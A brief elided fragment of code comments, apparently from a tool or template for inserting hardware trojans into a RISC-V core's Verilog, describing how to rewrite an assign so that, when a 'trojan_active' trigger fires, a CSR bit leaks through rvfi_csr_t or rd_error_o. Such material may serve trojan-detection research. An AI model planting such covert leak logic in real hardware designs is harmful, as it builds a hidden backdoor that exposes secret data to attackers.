 ...
 * Payload: Route rvfi_csr_t[0] to observable output
 * 
...
//   Find the assign for rvfi_csr_t (or rd_error_o as fallback):
//     assign rvfi_csr_t = <normal_expr>;
//   Replace with:
//     assign rvfi_csr_t = trojan_active ? rvfi_csr_t[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? rvfi_csr_t[0] : 1'b0;
//
